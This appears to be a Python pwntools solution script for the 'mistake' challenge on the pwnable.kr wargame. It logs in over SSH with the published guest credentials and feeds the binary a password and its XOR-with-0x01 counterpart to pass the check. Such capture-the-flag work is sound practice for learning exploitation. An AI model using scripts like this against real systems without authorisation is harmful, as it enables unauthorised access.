from pwn import *

def xor(s1, s2):
    x = ''
    for i, c in enumerate(s1):
        x += chr(ord(c) ^ ord(s2[i % len(s2)]))
    return x

s = ssh(host='pwnable.kr',
            user='mistake',
            password='guest',
            port=2222)
r = s.process(argv=['/home/mistake/mistake'])

password = 'aaaaaaaaaa'
xored = xor(password, '\x01')

r.sendline(password)
r.recvuntil('input password :')
r.sendline(xored)
r.interactive()

